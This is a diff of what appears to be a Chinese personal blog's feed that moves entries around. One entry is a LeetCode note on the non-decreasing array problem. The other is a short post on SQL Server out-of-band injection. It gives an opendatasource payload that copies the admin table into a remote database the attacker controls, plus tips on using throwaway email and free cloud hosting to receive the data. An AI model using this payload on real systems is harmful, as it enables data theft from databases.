@@ -111,35 +111,16 @@
         <content type="html"><![CDATA[<h2 id="LeetCode刷题笔记"><a href="#LeetCode刷题笔记" class="headerlink" title="LeetCode刷题笔记"></a>LeetCode刷题笔记</h2><h3 id="非递减数列"><a href="#非递减数列" class="headerlink" title="非递减数列"></a>非递减数列</h3><p><strong>题目链接：<a href="https://leetcode-cn.com/problems/non-decreasing-array/submissions/" target="_blank" rel="noopener">https://leetcode-cn.com/problems/non-decreasing-array/submissions/</a></strong></p><hr><blockquote><p>给定一个长度为 n 的整数数组，你的任务是判断在最多改变 1 个元素的情况下，该数组能否变成一个非递减数列。</p></blockquote><p>我们是这样定义一个非递减数列的： 对于数组中所有的 i (1 &lt;= i &lt; n)，满足 array[i] &lt;= array[i + 1]。<br><a id="more"></a><br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">示例 1:</span><br><span class="line"><span class="section">输入: [4,2,3]</span></span><br><span class="line"><span class="section">输出: True</span></span><br><span class="line"><span class="section">解释: 你可以通过把第一个4变成1来使得它成为一个非递减数列。</span></span><br><span class="line">示例 2:</span><br><span class="line"><span class="section">输入: [4,2,1]</span></span><br><span class="line"><span class="section">输出: False</span></span><br><span class="line"><span class="section">解释: 你不能在只改变一个元素的情况下将其变为非递减数列。</span></span><br><span class="line"><span class="section">说明:  n 的范围为 [1, 10,000]。</span></span><br></pre></td></tr></table></figure></p><hr><h4 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h4><blockquote><p>写这个题的时候脑子昏昏沉沉的，写了半天总是不对，看了下大佬的思路，然后就思路清晰~<br>此题只能改变一次，所以建立一个flag保存改变次数，如果改变次数大于1，直接return False<br>发现nums[i] &gt; nums[i+1]时有两种选择使它变成非递减数列</p><ol><li>nums[i]   = nums[i+1]</li><li>nums[i+1] = nums[i]<br>第一种情况时需要考虑将nums[i] = nums[i+1]后，因为已经判断过nums[i] &gt;= nums[i-1]成立，而nums[i] = nums[i+1]语句运行后，nums[i]变小了，需要再次判断是否nums[i] &gt;= nums[i-1],如果nums[i] &lt; nums[i-1]，则进入第二种情况。<br>第二种情况将nums[i+1] = nums[i]并没有什么特别之处，因为循环是往后运行的，可以检查出是否会有问题</li></ol></blockquote><table><thead><tr><th>提交结果</th><th>执行用时</th><th>内存消耗</th><th>语言</th></tr></thead><tbody><tr><td>超出时间限制</td><td>240 ms</td><td>15.1 MB</td><td>Python3</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkPossibility</span><span class="params">(self, nums: List[int])</span> -&gt; bool:</span></span><br><span class="line">        flag = <span class="number">1</span></span><br><span class="line">        tmp  = <span class="number">2</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)<span class="number">-1</span>):</span><br><span class="line">            <span class="keyword">if</span>(nums[i]&gt;nums[i+<span class="number">1</span>]):</span><br><span class="line">                flag -= <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span>(flag&lt;<span class="number">0</span>):</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">                k = nums[i]</span><br><span class="line">                <span class="comment">#将nums[i]的值改为nums[i+1]的值</span></span><br><span class="line">                nums[i] = nums[i+<span class="number">1</span>]</span><br><span class="line">                <span class="keyword">if</span>(nums[i]&lt;nums[i<span class="number">-1</span>] <span class="keyword">and</span> i&gt;=<span class="number">1</span>):</span><br><span class="line">                    nums[i] = k</span><br><span class="line">                <span class="comment">#将nums[i+1]的值改为nums[i]的值</span></span><br><span class="line">                    nums[i+<span class="number">1</span>] = nums[i]</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br></pre></td></tr></table></figure><hr><blockquote><p>这个题题解数目较少，python3解法大同小异，找到另一个题解，思路和我的一样，不过写的更清晰</p></blockquote><table><thead><tr><th>提交结果</th><th>执行用时</th><th>内存消耗</th><th>语言</th></tr></thead><tbody><tr><td>超出时间限制</td><td>236 ms</td><td>15.1 MB</td><td>Python3</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkPossibility</span><span class="params">(self, nums: List[int])</span> -&gt; bool:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)<span class="number">-1</span>):</span><br><span class="line">            <span class="keyword">if</span> nums[i] &gt; nums[i+<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">if</span> i==<span class="number">0</span>:</span><br><span class="line">                    nums[<span class="number">0</span>]=nums[<span class="number">1</span>]</span><br><span class="line">                <span class="keyword">elif</span> nums[i<span class="number">-1</span>]&gt;nums[i+<span class="number">1</span>]:</span><br><span class="line">                    nums[i+<span class="number">1</span>]=nums[i]</span><br><span class="line">                <span class="keyword">elif</span> nums[i<span class="number">-1</span>]&lt;nums[i+<span class="number">1</span>]:</span><br><span class="line">                    nums[i]=nums[i<span class="number">-1</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)<span class="number">-1</span>):</span><br><span class="line">            <span class="keyword">if</span> nums[i] &gt; nums[i+<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br></pre></td></tr></table></figure>]]></content>
       
       
-      
-        <tags>
-            
-            <tag> LeetCode刷题笔记 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>SQLSever的反弹注入</title>
-      <link href="/2019/10/14/sqlsever%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A5/"/>
-      <url>/2019/10/14/sqlsever%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A5/</url>
-      
-        <content type="html"><![CDATA[<p>主要是利用opendatasource函数，这个函数说白了就是把在某一个数据库查询的结果传输到另一个数据库的某个表中，但是有一个限制条件，就是接受数据的表的字段数必须和查询数据的表的字段数相同。</p><p>这种注入方式适用于没有回显的，注入工具注入不进去并且过于缓慢的（所以可以说是一种骚姿势？）<br><a id="more"></a><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> opendatasource(<span class="string">'sqloledb'</span>,<span class="string">'server=服务器;uid=登陆的用户名;pwd=登陆的密码;database=数据库名'</span>).数据库名.dbo.数据库中的表名 <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span><span class="comment">--</span></span><br></pre></td></tr></table></figure></p><blockquote><p>select * from admin –</p></blockquote><p>是可以自定义的sql语句，但是要注意在sqlsever中#不能注释，要用–才可以</p><p>这个可以说是一个小知识点，但是有要求，需要接收数据的数据库有自己的公网ip。所以可以用十分钟邮箱</p><p><a href="http://note.youdao.com/" target="_blank" rel="noopener">http://24mail.chacuo.net/</a></p><p>到香港云注册一个新账号，香港云新账号可以试用一个60天的虚拟空间，虚拟空间有公网ip和sqlsever、mysql数据库，这样就可以不本地安装了</p><p>香港云<a href="http://note.youdao.com/" target="_blank" rel="noopener">http://www.webweb.com</a></p>]]></content>
-      
-      
       <categories>
           
-          <category> 渗透测试 </category>
+          <category> LeetCode刷题笔记 </category>
           
       </categories>
       
       
         <tags>
             
-            <tag> sql注入 </tag>
+            <tag> LeetCode刷题笔记 </tag>
             
         </tags>
       
@@ -190,6 +171,31 @@
         <tags>
             
             <tag> LeetCode刷题笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>SQLSever的反弹注入</title>
+      <link href="/2019/10/14/sqlsever%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A5/"/>
+      <url>/2019/10/14/sqlsever%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A5/</url>
+      
+        <content type="html"><![CDATA[<p>主要是利用opendatasource函数，这个函数说白了就是把在某一个数据库查询的结果传输到另一个数据库的某个表中，但是有一个限制条件，就是接受数据的表的字段数必须和查询数据的表的字段数相同。</p><p>这种注入方式适用于没有回显的，注入工具注入不进去并且过于缓慢的（所以可以说是一种骚姿势？）<br><a id="more"></a><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> opendatasource(<span class="string">'sqloledb'</span>,<span class="string">'server=服务器;uid=登陆的用户名;pwd=登陆的密码;database=数据库名'</span>).数据库名.dbo.数据库中的表名 <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span><span class="comment">--</span></span><br></pre></td></tr></table></figure></p><blockquote><p>select * from admin –</p></blockquote><p>是可以自定义的sql语句，但是要注意在sqlsever中#不能注释，要用–才可以</p><p>这个可以说是一个小知识点，但是有要求，需要接收数据的数据库有自己的公网ip。所以可以用十分钟邮箱</p><p><a href="http://note.youdao.com/" target="_blank" rel="noopener">http://24mail.chacuo.net/</a></p><p>到香港云注册一个新账号，香港云新账号可以试用一个60天的虚拟空间，虚拟空间有公网ip和sqlsever、mysql数据库，这样就可以不本地安装了</p><p>香港云<a href="http://note.youdao.com/" target="_blank" rel="noopener">http://www.webweb.com</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> sql注入 </tag>
             
         </tags>
       
